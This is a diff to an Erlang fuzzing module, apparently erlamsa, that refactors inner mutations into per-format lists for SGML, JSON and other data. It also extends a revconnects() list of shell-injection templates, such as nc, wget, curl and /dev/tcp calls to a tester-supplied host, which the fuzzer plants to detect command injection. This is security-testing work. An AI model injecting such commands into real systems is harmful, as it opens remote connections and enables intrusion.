@@ -37,8 +37,7 @@
 
 %% API
 -export([make_mutator/2, mutators_mutator/1, mutations/0, mutations/1, default/1, tostring/1, 
-         get_max_score/0, inner_mutations/0, get_ssrf_uri/0, basic_type_mutation/2]).
- 
+         get_max_score/0, inner_mutations/1, get_ssrf_uri/0, basic_type_mutation/2]).
 
 -define(MIN_SCORE, 2.0).
 -define(MAX_SCORE, 10.0).
@@ -464,7 +463,7 @@ shellinjects() ->
 revconnects() -> 
     [
         "calc.exe & notepad.exe ~s ~p ", "nc ~s ~p", "wget http://~s:~p", "curl ~s ~p",
-        "exec 3<>/dev/tcp/~s/~p", "sleep 100000 # ~s ~p "
+        "exec 3<>/dev/tcp/~s/~p", "sleep 100000 # ~s ~p ", "echo>/tmp/erlamsa.~s.~p"
     ].
     
 -spec random_badness() -> list().
@@ -1145,11 +1144,9 @@ zip_path_traversal([H|T], Meta) ->
 %%  Basic type mutations (for fuzzing record-related (e.g. protobuf, ASN.1, etc) data
 %%
 
-%% TODO: use them in SGML and JSON?
-
 -spec basic_mutate_binary(binary()) -> binary().
 basic_mutate_binary(Binary) -> 
-    Muta = erlamsa_mutations:mutators_mutator(erlamsa_mutations:inner_mutations()),
+    Muta = erlamsa_mutations:mutators_mutator(erlamsa_mutations:inner_mutations(default)),
     {_NewMuta, NewLstBin, _Meta} = Muta([Binary], []),
     hd(NewLstBin).
 
@@ -1318,20 +1315,22 @@ mutas_list(Lst) ->
     lists:map(fun({Score, Pri, F, Name, _Desc}) -> {Score, Pri, F, Name} end, Lst).
 
 %% JSON/XML inner mutations
--spec inner_mutations_list() -> [atom()].
-inner_mutations_list() -> [ab, ad, ber, b64, ld, lp, lri, lr, num, sd, srnd, sxor, uri, zip].
+-spec inner_mutations_list(atom()) -> [atom()].
+inner_mutations_list(sgml) -> [ab, ad, bd, b64, ld, lp, lri, lr, num, sd, uri, json];
+inner_mutations_list(json) -> [ab, ad, b64, num, sd, sp, sr, uri, sgm];
+inner_mutations_list(_) -> [ab, ad, ber, b64, ld, lp, lri, lr, num, sd, srnd, sxor, uri, zip].
 
--spec inner_mutations() -> [mutation()].
-inner_mutations() ->        
-                    InnerMutationsMap = maps:from_list(lists:map(fun (A) -> {A, ok} end, inner_mutations_list())),
-                    lists:foldl(
-                        fun({Sc, Pri, Fun, Name, _Desc}, Acc) ->
-                            case maps:get(Name, InnerMutationsMap, no) of
-                                ok -> [{Sc, Pri, Fun, Name}|Acc];
-                                no -> Acc
-                            end
-                        end,
-                    [], mutations([])).
+-spec inner_mutations(atom()) -> [mutation()].
+inner_mutations(Case) ->        
+    InnerMutationsMap = maps:from_list(lists:map(fun (A) -> {A, ok} end, inner_mutations_list(Case))),
+    lists:foldl(
+        fun({Sc, Pri, Fun, Name, _Desc}, Acc) ->
+            case maps:get(Name, InnerMutationsMap, no) of
+                ok -> [{Sc, Pri, Fun, Name}|Acc];
+                no -> Acc
+            end
+        end,
+    [], mutations([])).
 
 -spec default(list()) -> [{atom(), non_neg_integer()}].
 default(CustomMutas) -> [{Name, Pri} || {_, Pri, _, Name, _Desc} <- mutations(CustomMutas)].
